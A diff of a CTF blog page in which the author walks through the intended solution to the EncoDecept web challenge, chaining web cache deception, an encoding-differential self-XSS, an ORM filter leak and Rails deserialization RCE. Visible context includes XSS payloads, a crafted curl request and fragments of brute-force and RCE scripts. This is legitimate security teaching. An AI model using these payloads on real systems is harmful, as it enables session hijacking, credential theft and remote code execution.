@@ -1,17 +1,23 @@
-<!DOCTYPE html><html lang="en" style="--hue:#C8CCFF;--tint:#F0F2FF"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>EncoDecept: HTB University CTF 2024 · xclow3n</title><meta name="description" content="Intended solution for EncoDecept challenge from Hack the Box University CTF 2024 involving Web Cache Deception, encoding differential attacks, and ORM leak exploitation."><link rel="canonical" href="https://xclow3n.com/post/encodecept/"><meta property="og:type" content="article"><meta property="og:title" content="EncoDecept: HTB University CTF 2024 · xclow3n"><meta property="og:description" content="Intended solution for EncoDecept challenge from Hack the Box University CTF 2024 involving Web Cache Deception, encoding differential attacks, and ORM leak exploitation."><meta property="og:url" content="https://xclow3n.com/post/encodecept/"><meta property="og:site_name" content="xclow3n"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="EncoDecept: HTB University CTF 2024 · xclow3n"><meta name="twitter:description" content="Intended solution for EncoDecept challenge from Hack the Box University CTF 2024 involving Web Cache Deception, encoding differential attacks, and ORM leak exploitation."><meta name="author" content="Rajat Raghav"><meta name="theme-color" content="#090C0E"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Anton&family=Archivo:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap"><style>:root{--ground:#090C0E;--ground-2:#11161A;--paper:#FFFFFF;--rule:rgba(255,255,255,.22);--rule-2:rgba(255,255,255,.11);--dim:rgba(255,255,255,.54);--gap:10px;--display:"Anton","Arial Narrow",Haettenschweiler,Impact,sans-serif;--body:"Archivo",-apple-system,"Helvetica Neue",Arial,sans-serif;--mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,monospace;color-scheme:dark}*,*:before,*:after{margin:0;padding:0;box-sizing:border-box}html{background:var(--ground);-webkit-text-size-adjust:100%;scroll-behavior:smooth}body{background:var(--ground);color:var(--paper);font-family:var(--body);-webkit-font-smoothing:antialiased;text-rendering:optimizeLegibility;overflow-x:clip}a{color:inherit;text-decoration:none}ul,ol{list-style:none}h1,h2,h3{font-weight:400;font-family:var(--display);text-transform:uppercase}img{max-width:100%;display:block}::selection{background:var(--paper);color:var(--ground)}:root{scrollbar-color:#2A3034 var(--ground);scrollbar-width:thin}::-webkit-scrollbar{width:11px;height:11px}::-webkit-scrollbar-track{background:var(--ground)}::-webkit-scrollbar-thumb{background:#2a3034;border:3px solid var(--ground)}::-webkit-scrollbar-thumb:hover{background:#4a5257}:focus-visible{outline:3px solid var(--paper);outline-offset:2px}.rail{display:flex;flex-wrap:wrap;gap:8px 26px;align-items:baseline;padding:16px 20px 11px;border-bottom:1px solid var(--rule);font-size:10px;letter-spacing:.22em;text-transform:uppercase;font-weight:600}.rail .sp{margin-left:auto}.rail .mut{color:var(--dim);font-weight:500}.rail a:hover{color:var(--paper)}.foot{display:flex;flex-wrap:wrap;gap:10px 26px;align-items:baseline;margin:0 20px;padding:20px 0 26px;border-top:1px solid var(--rule-2);font-size:10px;letter-spacing:.2em;text-transform:uppercase;font-weight:600;color:var(--dim)}.foot .sp{margin-left:auto}.foot a:hover{color:var(--paper)}.fact{display:inline-block;font-family:var(--mono);font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:5px 9px 4px}@media(prefers-reduced-motion:reduce){html{scroll-behavior:auto}*,*:before,*:after{animation-duration:.01ms!important;transition-duration:.01ms!important}}@media(max-width:640px){.rail{padding:12px 14px 9px;gap:6px 16px}.foot{margin:0 14px}}
-</style><link rel="stylesheet" href="/_astro/_slug_.Cb_o2QD9.css"></head> <body>  <div class="progress" aria-hidden="true"><i id="bar"></i></div> <header class="rail"> <a href="/"><b>&larr; xclow3n</b></a> <span class="mut">Poster 02</span> <span class="sp mut">MY CHALLENGES</span> <time datetime="2024-11">NOV 2024</time> </header>  <section class="head"> <div class="head__text"> <div class="meta"> <span class="num">02</span> <span>Web Cache Deception</span>  </div> <h1>EncoDecept: HTB University CTF 2024</h1> <p class="stand">Intended solution for EncoDecept challenge from Hack the Box University CTF 2024 involving Web Cache Deception, encoding differential attacks, and ORM leak exploitation.</p> <ul class="facts"><li class="fact">web cache deception</li><li class="fact">ORM leak</li></ul> <ul class="tags"><li>CTF</li><li>Web</li><li>Cache Deception</li><li>XSS</li><li>ORM Leak</li><li>Rails</li></ul> </div> <div class="head__art head__art--image" aria-hidden="true"> <img src="/images/posters/encodecept-comic-v1.webp" alt="" width="1003" height="1568" style="--focus:50% 30%" decoding="async" fetchpriority="high"> </div> </section> <div class="reading"> <nav class="toc" aria-label="Sections"> <p class="toc__cap">Contents</p> <ol> <li><a href="#encodecept-web" data-sec="encodecept-web"> <i>01</i><span>EncoDecept (WEB)</span> </a></li><li><a href="#understanding-functionality" data-sec="understanding-functionality"> <i>02</i><span>Understanding functionality</span> </a></li><li><a href="#cache-deception" data-sec="cache-deception"> <i>03</i><span>Cache Deception</span> </a></li><li><a href="#self-xss" data-sec="self-xss"> <i>04</i><span>Self XSS</span> </a></li><li><a href="#orm-leak" data-sec="orm-leak"> <i>05</i><span>ORM Leak</span> </a></li> </ol> </nav> <details class="toc-m"> <summary>Contents &middot; 5 sections</summary> <ol> <li><a href="#encodecept-web"> <i>01</i><span>EncoDecept (WEB)</span> </a></li><li><a href="#understanding-functionality"> <i>02</i><span>Understanding functionality</span> </a></li><li><a href="#cache-deception"> <i>03</i><span>Cache Deception</span> </a></li><li><a href="#self-xss"> <i>04</i><span>Self XSS</span> </a></li><li><a href="#orm-leak"> <i>05</i><span>ORM Leak</span> </a></li> </ol> </details> <article class="doc"><h2 id="encodecept-web">EncoDecept (WEB)</h2>
+<!DOCTYPE html><html lang="en"> <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>EncoDecept: HTB University CTF 2024 · xclow3n</title><meta name="description" content="Intended solution for EncoDecept challenge from Hack the Box University CTF 2024 involving Web Cache Deception, encoding differential attacks, and ORM leak exploitation."><link rel="canonical" href="https://xclow3n.com/post/encodecept/"><meta property="og:type" content="article"><meta property="og:title" content="EncoDecept: HTB University CTF 2024"><meta property="og:description" content="Intended solution for EncoDecept challenge from Hack the Box University CTF 2024 involving Web Cache Deception, encoding differential attacks, and ORM leak exploitation."><meta property="og:url" content="https://xclow3n.com/post/encodecept/"><meta property="og:site_name" content="xclow3n"><meta property="og:image" content="https://xclow3n.com/images/social/encodecept.jpg"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta property="og:image:alt" content="EncoDecept: HTB University CTF 2024"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://xclow3n.com/images/social/encodecept.jpg"><meta name="twitter:title" content="EncoDecept: HTB University CTF 2024"><meta name="twitter:description" content="Intended solution for EncoDecept challenge from Hack the Box University CTF 2024 involving Web Cache Deception, encoding differential attacks, and ORM leak exploitation."><meta name="author" content="Rajat Raghav"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><link rel="alternate" type="application/rss+xml" title="xclow3n" href="/rss.xml"><meta name="theme-color" content="#000000"><meta name="color-scheme" content="dark"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,500;0,700;1,400&amp;display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&amp;display=swap&amp;text=%E2%94%80%E2%94%82%E2%94%8C%E2%94%90%E2%94%94%E2%94%98%E2%94%9C%E2%94%A4%E2%94%AC%E2%94%B4%E2%94%BC%E2%94%81%E2%94%83%E2%94%8F%E2%94%93%E2%94%97%E2%94%9B%E2%94%A3%E2%94%AB%E2%94%B3%E2%94%BB%E2%95%8B%E2%96%80%E2%96%84%E2%96%88%E2%96%8C%E2%96%90%E2%96%91%E2%96%92%E2%96%93%E2%96%94%E2%96%81%E2%96%8F%E2%96%95%E2%96%A0%E2%96%A1%E2%96%AA%E2%96%AB%E2%97%86%E2%97%87%E2%97%8F%E2%97%8B%C2%B7%E2%80%A2%E2%88%99%E2%86%97%E2%86%92%E2%86%90%E2%86%91%E2%86%93%E2%9F%A9%E2%9F%A8%C2%BB%C2%AB%E2%95%B1%E2%95%B2%E2%95%B3%E2%95%B4%E2%95%B5%E2%95%B6%E2%95%B7"><!-- Pre-paint, and the same flag the index uses: the progress rule and the
+     key legend are the two things on this page that claim a script is alive,
+     and neither may be painted before one is. The behaviour script at the
+     foot takes it back off if it throws. --><script>document.documentElement.dataset.js = '1';</script><link rel="stylesheet" href="/_astro/_slug_.BInTf9cN.css"></head> <body class="zn">  <div class="prog" id="prog" aria-hidden="true"></div> <div class="page"> <header class="top"> <a class="home" href="/"> <pre class="mark" role="img" aria-label="xclow3n">█   █  ███  █      ███  █   █ ████  █   █
+ █ █  █     █     █   █ █   █     █ ██  █
+  █   █     █     █   █ █ █ █  ███  █ █ █
+ █ █  █     █     █   █ █ █ █     █ █  ██
+█   █  ███  █████  ███   █ █  ████  █   █</pre> </a> <a class="back" href="/"><span aria-hidden="true">&#8592;</span> Roster</a> </header> <div class="head"> <div class="cap" aria-hidden="true"> <span>┌</span><span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="lab key">File 01</span> <span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="lab">MY CHALLENGES</span> <span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><span>┐</span> </div> <div class="headtx"> <h1>EncoDecept: HTB University CTF 2024</h1> <p class="dek">Web Cache Deception</p> </div>   <div class="cap" aria-hidden="true"> <span>└</span><span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="lab">NOV 2024</span> <span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="lab">3 min</span> <span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><span>┘</span> </div>  <div class="banner"> <img src="/images/poster/encodecept.png" alt="" width="1600" height="1200" decoding="async" loading="eager"> </div> </div>  <nav class="toc" id="toc" aria-label="Sections"> <details class="toc__d" id="tocd"> <summary class="toc__s"> <span class="toc__lab">Contents</span> <span class="toc__now" id="tocnow" aria-hidden="true"></span> </summary> <div class="toc__p"> <ol class="toc__l"> <li class="toc__i"> <a href="#encodecept-web" data-h="encodecept-web"> <b class="toc__n" aria-hidden="true">01</b> <span class="toc__t">EncoDecept (WEB)</span> </a> </li><li class="toc__i"> <a href="#understanding-functionality" data-h="understanding-functionality"> <b class="toc__n" aria-hidden="true">02</b> <span class="toc__t">Understanding functionality</span> </a> </li><li class="toc__i"> <a href="#cache-deception" data-h="cache-deception"> <b class="toc__n" aria-hidden="true">03</b> <span class="toc__t">Cache Deception</span> </a> </li><li class="toc__i"> <a href="#self-xss" data-h="self-xss"> <b class="toc__n" aria-hidden="true">04</b> <span class="toc__t">Self XSS</span> </a> </li><li class="toc__i"> <a href="#orm-leak" data-h="orm-leak"> <b class="toc__n" aria-hidden="true">05</b> <span class="toc__t">ORM Leak</span> </a> </li> </ol> <p class="toc__k" aria-hidden="true"><b>J</b>/<b>K</b> section</p> </div> </details> </nav> <article class="art"> <h2 id="encodecept-web">EncoDecept (WEB)</h2>
 <p>This is the intended solution for EncoDecept, a challenge I created for Hack the Box University CTF 2024.</p>
 <h2 id="understanding-functionality">Understanding functionality</h2>
 <p>Visiting the home page displays an auth page we can register and login:</p>
-<p><img src="/images/encodecept/login.webp" alt="Login Page"></p>
+<figure><a class="shot" href="/images/encodecept/login.webp" target="_blank" rel="noopener"><img src="/images/encodecept/login.webp" alt="Login Page"></a></figure>
 <p>After registering and logging in, we see the following home page:</p>
-<p><img src="/images/encodecept/home.webp" alt="Home Page"></p>
+<figure><a class="shot" href="/images/encodecept/home.webp" target="_blank" rel="noopener"><img src="/images/encodecept/home.webp" alt="Home Page"></a></figure>
 <p>We can create contracts:</p>
-<p><img src="/images/encodecept/create.webp" alt="Create Contract"></p>
+<figure><a class="shot" href="/images/encodecept/create.webp" target="_blank" rel="noopener"><img src="/images/encodecept/create.webp" alt="Create Contract"></a></figure>
 <p>Update our username, add a bio with markdown support:</p>
-<p><img src="/images/encodecept/setting.webp" alt="Settings Page"></p>
+<figure><a class="shot" href="/images/encodecept/setting.webp" target="_blank" rel="noopener"><img src="/images/encodecept/setting.webp" alt="Settings Page"></a></figure>
 <p>And finally report a contract:</p>
-<p><img src="/images/encodecept/report.webp" alt="Report Contract"></p>
+<figure><a class="shot" href="/images/encodecept/report.webp" target="_blank" rel="noopener"><img src="/images/encodecept/report.webp" alt="Report Contract"></a></figure>
 <p>That’s all the functionality we can access.</p>
 <h2 id="cache-deception">Cache Deception</h2>
 <p>The challenge uses Nginx as a reverse caching proxy:</p>
@@ -46,7 +52,7 @@
 <p>With a payload like <code>/profile.ico</code>, we can poison the cache. However, to escalate further, we need an XSS or self-XSS vulnerability.</p>
 <h2 id="self-xss">Self XSS</h2>
 <p>The application supports markdown on the settings page:</p>
-<p><img src="/images/encodecept/setx.webp" alt="Settings with Markdown"></p>
+<figure><a class="shot" href="/images/encodecept/setx.webp" target="_blank" rel="noopener"><img src="/images/encodecept/setx.webp" alt="Settings with Markdown"></a></figure>
 <p>This is not directly vulnerable to XSS, but examining the server headers reveals:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="http"><code><span class="line"><span style="color:#FF7B72">HTTP</span><span style="color:#E6EDF3">/</span><span style="color:#79C0FF">1.1</span><span style="color:#79C0FF"> 200</span><span style="color:#A5D6FF"> OK</span></span>
 <span class="line"><span style="color:#7EE787">Server</span><span style="color:#FF7B72">:</span><span style="color:#A5D6FF"> nginx/1.26.2</span></span>
@@ -56,9 +62,9 @@
 <p>The <code>Content-Type</code> header does not specify a charset, and the charset is not defined with a meta tag either. This makes the page vulnerable to encoding differential attacks, as explained in <a href="https://www.sonarsource.com/blog/encoding-differentials-why-charset-matters/">this research</a>. Switching to the JIS X 0208 1978 charset lets us break out of the HTML context. I used a proxy to send the following request and update the <code>bio</code>:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#FFA657">curl</span><span style="color:#A5D6FF"> 'http://127.0.0.1:1337/settings'</span><span style="color:#79C0FF"> -X</span><span style="color:#A5D6FF"> POST</span><span style="color:#A5D6FF"> ...SNIP...</span><span style="color:#79C0FF"> --data-raw</span><span style="color:#A5D6FF"> '_method=patch&#x26;authenticity_token=loph8GcIcxns14fBxvHfIT69DosomkrGvXrdX_jcbPzuYgEeGB-UergMjfFG9crk3HGhHUjZ6sgBD_GKvLlgAw&#x26;username=test&#x26;bio=![%1b$@](test.png)+superman+![batman](shaktiman.png)&#x26;commit=Update+Settings'</span></span></code></pre>
 <p>We pass the following as the bio: <code>![%1b$@](test.png)+superman+![batman](shaktiman.png)</code>. If this works, we should see a bunch of random characters.</p>
-<p><img src="/images/encodecept/ran.webp" alt="Random Characters Output"></p>
+<figure><a class="shot" href="/images/encodecept/ran.webp" target="_blank" rel="noopener"><img src="/images/encodecept/ran.webp" alt="Random Characters Output"></a></figure>
 <p>The encoding differential worked in Chrome. I then used the following payload to execute JavaScript: <code>![%1b$@](test.png)+%1B(B+![batman](onerror=alert(1)//)</code></p>
-<p><img src="/images/encodecept/al.webp" alt="XSS Alert Box"></p>
+<figure><a class="shot" href="/images/encodecept/al.webp" target="_blank" rel="noopener"><img src="/images/encodecept/al.webp" alt="XSS Alert Box"></a></figure>
 <p>An alert box appears, confirming the XSS vulnerability. Next, we move on to the report functionality. The report feature takes a URL and simply visits it:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> startChromiumBot</span><span style="color:#E6EDF3">(url):</span></span>
 <span class="line"><span style="color:#E6EDF3">    chrome_options </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Options()</span></span>
@@ -162,7 +168,7 @@
 <span class="line"><span style="color:#E6EDF3">cachePoison()</span></span>
 <span class="line"><span style="color:#E6EDF3">reportURL()</span></span></code></pre>
 <p>This script registers a new user, logs in, updates the bio with an XSS payload, performs cache deception, and reports it. On our webhook, we receive a request:</p>
-<p><img src="/images/encodecept/hk.webp" alt="Webhook Request"></p>
+<figure><a class="shot" href="/images/encodecept/hk.webp" target="_blank" rel="noopener"><img src="/images/encodecept/hk.webp" alt="Webhook Request"></a></figure>
 <h2 id="orm-leak">ORM Leak</h2>
 <p>The XSS runs as <code>contract_manager</code>, but its cookie is <code>HttpOnly</code>. The useful attack surface is therefore the functionality available to that account. The Django API includes this endpoint:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">class</span><span style="color:#FFA657"> FilteredContractsView</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">APIView</span><span style="color:#E6EDF3">):</span></span>
@@ -183,7 +189,7 @@
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#E6EDF3">filtered_data </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> {key: value </span><span style="color:#FF7B72">for</span><span style="color:#E6EDF3"> key, value </span><span style="color:#FF7B72">in</span><span style="color:#E6EDF3"> request.data.items() </span><span style="color:#FF7B72">if</span><span style="color:#E6EDF3"> key </span><span style="color:#FF7B72">!=</span><span style="color:#A5D6FF"> "all"</span><span style="color:#E6EDF3">}</span></span>
 <span class="line"><span style="color:#E6EDF3">contracts </span><span style="color:#FF7B72">=</span><span style="color:#E6EDF3"> Contract.objects.filter(</span><span style="color:#FF7B72">**</span><span style="color:#E6EDF3">filtered_data)</span></span></code></pre>
 <p>Logging in as <code>contract_manager</code> on a local instance shows how the frontend calls the endpoint.</p>
-<p><img src="/images/encodecept/fil.webp" alt="Filtered Contracts"></p>
+<figure><a class="shot" href="/images/encodecept/fil.webp" target="_blank" rel="noopener"><img src="/images/encodecept/fil.webp" alt="Filtered Contracts"></a></figure>
 <p>It simply passes the parameters as URL parameters. The contract model has a foreign key:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line"><span style="color:#FF7B72">class</span><span style="color:#FFA657"> Contract</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">models</span><span style="color:#E6EDF3">.</span><span style="color:#79C0FF">Model</span><span style="color:#E6EDF3">):</span></span>
 <span class="line"><span style="color:#79C0FF">    ...SNIP...</span></span>
@@ -225,9 +231,9 @@
 <span class="line"><span style="color:#E6EDF3">}</span></span>
 <span class="line"><span style="color:#D2A8FF">bruteForce</span><span style="color:#E6EDF3">();</span></span></code></pre>
 <p>Using all of the above together gives us the admin’s password:</p>
-<p><img src="/images/encodecept/pas.webp" alt="Admin Password"></p>
+<figure><a class="shot" href="/images/encodecept/pas.webp" target="_blank" rel="noopener"><img src="/images/encodecept/pas.webp" alt="Admin Password"></a></figure>
 <p>Logging in as admin grants us access to new functionality, <code>Manage Templates</code>:</p>
-<p><img src="/images/encodecept/super.webp" alt="Manage Templates"></p>
+<figure><a class="shot" href="/images/encodecept/super.webp" target="_blank" rel="noopener"><img src="/images/encodecept/super.webp" alt="Manage Templates"></a></figure>
 <p>Examining the Rails controller for this feature:</p>
 <pre class="astro-code github-dark-default" style="background-color:#0d1117;color:#e6edf3; overflow-x: auto;" tabindex="0" data-language="ruby"><code><span class="line"><span style="color:#FF7B72">def</span><span style="color:#D2A8FF"> create</span></span>
 <span class="line"><span style="color:#FFA657">    user_data</span><span style="color:#FF7B72"> =</span><span style="color:#E6EDF3"> current_user </span><span style="color:#FF7B72">unless</span><span style="color:#E6EDF3"> user_data </span><span style="color:#FF7B72">&#x26;&#x26;</span><span style="color:#E6EDF3"> user_data[</span><span style="color:#A5D6FF">'id'</span><span style="color:#E6EDF3">]</span></span>
@@ -312,25 +318,186 @@
 <span class="line"><span style="color:#E6EDF3">login()</span></span>
 <span class="line"><span style="color:#E6EDF3">deserializationRCE(</span><span style="color:#A5D6FF">'detection.txt'</span><span style="color:#E6EDF3">)</span></span>
 <span class="line"><span style="color:#E6EDF3">deserializationRCE(</span><span style="color:#A5D6FF">'rce.txt'</span><span style="color:#E6EDF3">)</span></span></code></pre>
-<p>Running this script adds two templates. Viewing those templates results in RCE.</p></article> </div> <section class="end"> <div class="related"> <p class="cap">Same signals</p> <ul> <li style="--hue:#FFBABB"> <a href="/post/intergalactic-bounty/"> <span class="rn">03</span> <b>MXSS → RCE</b> <em>shared &middot; ctf</em> </a> </li><li style="--hue:#F7BCF1"> <a href="/post/sanitize-html-bypass-mxss/"> <span class="rn">05</span> <b>Mutation XSS</b> <em>shared &middot; xss</em> </a> </li> </ul> </div> <nav class="pager"> <a class="pg" href="/post/intergalactic-bounty/" style="--hue:#FFBABB"> <span class="dir">&larr; Newer</span> <b>Intergalactic Bounty: HTB University CTF 2024</b> </a> <span class="pg r none"><span class="dir">Older &rarr;</span><b>This is the earliest.</b></span> </nav> <p class="back"><a href="/">Back to posters</a></p> </section> <footer class="foot"> <span>Rajat Raghav &mdash; xclow3n</span> <a href="mailto:me@xclow3n.com">me@xclow3n.com</a> <span class="sp">Found, reported, patched.</span> </footer>  <script>
-(function () {
-  var doc = document.documentElement;
-  var links = Array.prototype.slice.call(document.querySelectorAll('.toc a'));
-  var secs = links.map(function (a) { return document.getElementById(a.dataset.sec); });
-  var tick = false;
+<p>Running this script adds two templates. Viewing those templates results in RCE.</p> </article> <footer class="end"> <div class="cap" aria-hidden="true"> <span>└</span><span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span> <span class="lab">End of file 01</span> <span class="f">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><span>┘</span> </div> <div class="endrow"> <a href="mailto:me@xclow3n.com">me@xclow3n.com</a> </div> </footer> </div> <script>
+/* THE RAIL, and the top edge.  Everything above works without this: every row
+   in the contents is a real link to a real id, the fold is the browser's own,
+   and the two things that would lie with the script dead — the progress rule
+   and the `J/K` legend — are painted only under [data-js], which this file
+   takes back off if anything below throws.
 
-  function paint() {
-    tick = false;
-    var max = Math.max(1, doc.scrollHeight - innerHeight);
-    doc.style.setProperty('--read', Math.min(100, (scrollY / max) * 100).toFixed(2) + '%');
-    var y = scrollY + innerHeight * 0.3, cur = -1;
-    secs.forEach(function (s, i) { if (s && s.offsetTop <= y) cur = i; });
-    links.forEach(function (a, i) { a.classList.toggle('on', i === cur); });
+   Four jobs.
+
+     1  PICK THE SHAPE.  Open at 1300 and up, where the rail has its own
+        margin to live in; closed under it, where it is a control line and an
+        open panel would cover the first screen of the article.  Re-run on
+        every change of the query, because a window gets resized and a tablet
+        gets turned.
+
+     2  SAY WHERE THE READER IS.  The current section is the LAST heading
+        whose top has passed the line, which is 90px down the window with the
+        rail and 120 under the strip.  Headings with no box are skipped, not
+        counted as passed: a heading folded inside a closed panel is not a
+        place the reader can be.  At the very bottom of the document the last
+        section is current whatever the arithmetic says, because the last
+        heading on a short final section never reaches the line.
+
+     3  JUMP.  A click on a row opens whatever panel the heading is folded
+        into before scrolling, rather than trusting the browser to reveal it,
+        and moves focus to the heading so the keyboard carries on from the
+        same place the eye does.  `j` and `k` walk the sections that are
+        actually on the page.  Both guards from the index are here: no
+        modifier, and nothing while focus is in a field.
+
+     4  DRAW THE TOP EDGE.  scrollY over the scrollable height, as a scaleX.
+        One rAF for all of it, so a scroll costs one write. */
+(function () {
+  var root = document.documentElement;
+  try {
+    var nav = document.getElementById('toc');
+    var det = document.getElementById('tocd');
+    var now = document.getElementById('tocnow');
+    var bar = document.getElementById('prog');
+
+    /* The rows and their headings, paired by the id the markdown pipeline
+       wrote.  A row whose heading is not in the document is dropped rather
+       than left to throw on the first scroll. */
+    var links = [], heads = [];
+    if (nav) {
+      [].slice.call(nav.querySelectorAll('a[data-h]')).forEach(function (a) {
+        var h = document.getElementById(a.getAttribute('data-h'));
+        if (h) { links.push(a); heads.push(h); }
+      });
+    }
+
+    /* IS THIS HEADING SOMEWHERE THE READER CAN BE?
+
+       Not `getClientRects().length`, which is what this started as and is
+       wrong: a heading folded inside a CLOSED panel still reports one rect,
+       832px wide and 50px tall, because Chromium lays the content out and
+       then declines to paint it. Measured in the browser, both ways round —
+       `checkVisibility` is false for that same heading and true for one in
+       the open document. The rect test is kept only as the fallback for a
+       browser with no `checkVisibility`, where it is at least never wrong
+       about a heading that is not in the layout at all. */
+    function shown(h) {
+      return h.checkVisibility
+        ? h.checkVisibility({ contentVisibilityAuto: true, opacityProperty: true, visibilityProperty: true })
+        : !!h.getClientRects().length;
+    }
+
+    var rail = window.matchMedia('(min-width:1300px)');
+    function shape() { if (det) det.open = rail.matches; }
+    if (rail.addEventListener) rail.addEventListener('change', shape);
+    else if (rail.addListener) rail.addListener(shape);
+    shape();
+
+    /* `sel` is where the keys are and moves with the key; `cur` is what the
+       page has marked, which lags the key by a smooth scroll. Three presses
+       of `j` inside one animation all read the same `cur` and all landed on
+       section 01 — measured, not supposed — so every move is computed from
+       `sel`, and `sel` only goes back to following the scroll once the jump
+       it started has had its 700ms. A wall clock, so a scroll that never
+       arrives cannot leave the keys stuck. */
+    var cur = -1, sel = -1, lock = 0, raf = 0;
+
+    function paint() {
+      raf = 0;
+      var y = window.scrollY || window.pageYOffset || 0;
+      var vh = window.innerHeight || root.clientHeight;
+      if (bar) {
+        var max = Math.max(1, root.scrollHeight - vh);
+        var p = y / max;
+        bar.style.transform = 'scaleX(' + (p < 0 ? 0 : p > 1 ? 1 : p) + ')';
+      }
+      if (!links.length) return;
+      var line = rail.matches ? 90 : 120;
+      var i = -1;
+      for (var k = 0; k < heads.length; k++) {
+        var h = heads[k];
+        if (!shown(h)) continue;
+        if (h.getBoundingClientRect().top <= line) i = k; else break;
+      }
+      if (y + vh >= root.scrollHeight - 2) i = heads.length - 1;
+      if (Date.now() > lock) sel = i;
+      if (i === cur) return;
+      if (cur > -1) links[cur].removeAttribute('aria-current');
+      cur = i;
+      if (cur > -1) {
+        links[cur].setAttribute('aria-current', 'location');
+        inview(links[cur]);
+      }
+      if (now) now.textContent = cur > -1 ? links[cur].querySelector('.toc__t').textContent : '';
+    }
+    function tick() { if (!raf) raf = requestAnimationFrame(paint); }
+
+    /* The rail scrolls on its own once the outline is longer than the window.
+       Only its own scrollTop is touched: scrollIntoView here would move the
+       PAGE as well, which is the one thing a reader scrolling must not have
+       done to them. */
+    function inview(a) {
+      /* `offsetParent` is the scroller in both shapes — the rail is the fixed
+         box at 1300 and up, the hanging panel is the absolute one below it —
+         and it is also what offsetTop is measured against, so the two cannot
+         disagree. Guarded to the nav, because an offsetParent that turned out
+         to be <body> would scroll the ARTICLE under the reader. */
+      var box = a.offsetParent;
+      if (!box || !nav.contains(box) || box.scrollHeight <= box.clientHeight) return;
+      var t = a.offsetTop, b = t + a.offsetHeight;
+      if (t < box.scrollTop) box.scrollTop = t - 8;
+      else if (b > box.scrollTop + box.clientHeight) box.scrollTop = b - box.clientHeight + 8;
+    }
+
+    function go(n) {
+      if (n < 0 || n >= heads.length) return;
+      sel = n;
+      lock = Date.now() + 700;
+      var h = heads[n], fold = h.closest ? h.closest('details') : null;
+      if (fold && fold !== det) fold.open = true;
+      h.scrollIntoView();
+      h.setAttribute('tabindex', '-1');
+      h.focus({ preventScroll: true });
+      if (history.replaceState) history.replaceState(null, '', '#' + h.id);
+      if (!rail.matches && det) det.open = false;
+      tick();
+    }
+
+    if (nav) {
+      nav.addEventListener('click', function (e) {
+        /* a modified click is the reader asking the BROWSER for something —
+           a new tab, a new window, a saved link — and this handler calling
+           preventDefault on it would eat all three */
+        if (e.metaKey || e.ctrlKey || e.shiftKey || e.altKey || e.button !== 0) return;
+        var a = e.target.closest ? e.target.closest('a[data-h]') : null;
+        if (!a) return;
+        var n = links.indexOf(a);
+        if (n < 0) return;
+        e.preventDefault();
+        go(n);
+      });
+    }
+
+    document.addEventListener('keydown', function (e) {
+      if (e.metaKey || e.ctrlKey || e.altKey || e.isComposing) return;
+      var t = e.target || {}, tag = t.tagName || '';
+      if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT' || t.isContentEditable) return;
+      var d = e.key === 'j' || e.key === 'J' ? 1 : e.key === 'k' || e.key === 'K' ? -1 : 0;
+      if (!d || !heads.length) return;
+      e.preventDefault();
+      /* walk to the next heading that is actually on the page, so `j` never
+         lands the reader inside a panel they have folded shut */
+      var n = sel;
+      do { n += d; } while (n >= 0 && n < heads.length && !shown(heads[n]));
+      if (n < 0 || n >= heads.length) return;
+      go(n);
+    });
+
+    window.addEventListener('scroll', tick, { passive: true });
+    window.addEventListener('resize', tick);
+    /* a panel opening or closing moves every heading below it */
+    document.addEventListener('toggle', tick, true);
